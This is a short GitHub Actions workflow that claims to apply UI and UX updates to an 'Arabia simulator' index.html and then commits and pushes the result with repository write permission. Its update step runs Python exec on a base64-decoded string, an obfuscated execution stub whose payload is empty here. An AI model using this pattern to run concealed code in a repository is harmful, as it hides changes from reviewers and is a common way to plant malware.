name: Arabia UI UX update

on:
  push:
    paths:
      - '.github/workflows/ui-ux-update.yml'

permissions:
  contents: write

jobs:
  update-ui:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply UI and UX updates
        shell: bash
        run: |
          python -c "import base64; exec(base64.b64decode(''))"
      - name: Commit updated simulator
        shell: bash
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add index.html
          if git diff --cached --quiet; then
            echo "No changes to commit"
            exit 0
          fi
          git commit -m "Refine Arabia simulator UI and UX"
          git push
